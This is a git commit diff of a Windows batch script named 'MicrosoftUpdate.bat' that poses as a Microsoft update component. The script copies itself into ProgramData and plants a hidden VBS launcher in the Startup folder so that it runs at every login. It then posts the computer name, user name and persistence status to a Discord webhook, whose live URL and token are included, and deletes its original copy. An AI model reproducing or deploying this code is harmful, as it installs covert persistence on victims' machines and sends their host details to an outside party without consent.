5cfcdd67eeaa5ede7b5a61221d22444887c49762
freestream <99094491+freestream-us-to@users.noreply.github.com>
2022-11-26 02:50:55 +0100

    Add files via upload

--- MicrosoftUpdate.bat
+++ MicrosoftUpdate.bat
@@ -10,29 +10,29 @@ mkdir "%PROGRAMDATA%/MicrosoftUpdate/"
 copy /y %~f0 "%PROGRAMDATA%\MicrosoftUpdate\"
 )
 
+if exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
+set userauto=YES
+)
 if not exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
-echo Set WshShell = WScript.CreateObject( "WScript.Shell" )>>"%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs"
 echo On Error Resume Next>>"%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs"
+echo Set WshShell = WScript.CreateObject( "WScript.Shell" ^)>>"%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs"
 echo WshShell.Run ^"^%APPDATA^%\MicrosoftUpdate\MicrosoftUpdate.bat^",0,True>>"%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs"
 echo WshShell.Run ^"^%PROGRAMDATA^%\MicrosoftUpdate\MicrosoftUpdate.bat^",0,True>>"%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs"
 set userauto=YES NEW CREATED
 )
-if exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
-set userauto=YES
-)
 
-if not exist "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
-set pcauto=NO NOT CREATED
-)
 if exist "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
 set pcauto=YES
+)
+if not exist "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
+set pcauto=NO NOT CREATED
 )
 
 set content=---------------------------\nPC: %ComputerName%\nUSER: %USERNAME%\nUSER-AUTOSTART: %userauto%\nPC-AUTOSTART: %pcauto%
 curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"%content%\"}" https://discord.com/api/webhooks/1045852501590675476/fUqcJcCA2TNtHiOLTIrcBJgZDFD_BPWpPoyud-5z3ucLn2fNWquHobLnEiglQtOMwb3v
 
-if %~f0 NEQ %APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/%~n0%~x0 (
-if %~f0 NEQ %PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/%~n0%~x0 (
+if %~f0 NEQ %APPDATA%/MicrosoftUpdate/%~n0%~x0 (
+if %~f0 NEQ %PROGRAMDATA%/MicrosoftUpdate/%~n0%~x0 (
 del /f /q %~f0
 ))
 
